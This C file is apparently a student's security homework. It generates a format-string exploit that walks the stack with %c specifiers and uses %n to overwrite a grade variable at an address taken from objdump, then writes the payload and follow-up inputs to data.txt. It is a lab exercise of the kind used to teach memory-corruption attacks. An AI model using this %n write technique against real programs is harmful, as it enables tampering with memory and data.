// Adam Marcus aem2nj
// HW 2
// attack-format-string.c
#include <stdio.h>
int main(void){
  // 0x0000000000601068 defaultLetterGrade address obtained via objdump
  char addr[] = "\x68\x10\x60\x00\x00\x00\x00\x00";
  
  // This begins with 17 format specifiers because each will move to the next
  // spot on the stack, until you get to the point where Default Letter
  // Grade is. After this, there are 48 x's, so that way there are 65
  // characters before the %n. 65 characters are needed because 65 is the
  // ascii value for A. After the %n to write, it uses AAAA as an offset so
  // it then takes in the address of Default Letter Grade to write the %n to
  char exploitString[] = "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%nAAAA\x68\x10\x60\x00\x00\x00\x00\x00";

  // This section writes my exploit string then the proper inputs to
  // proceed through the executable after overwriting Default Letter Grade
  // It writes them to the file "data.txt"
  FILE *exploitFile;
  exploitFile = fopen("data.txt", "w");
  fprintf(exploitFile, "%s\n", exploitString);
  fprintf(exploitFile, "n\n");
  fprintf(exploitFile, "Adam Marcus\n");
  fprintf(exploitFile, "y\n");
  fclose(exploitFile);

  return 0;
}
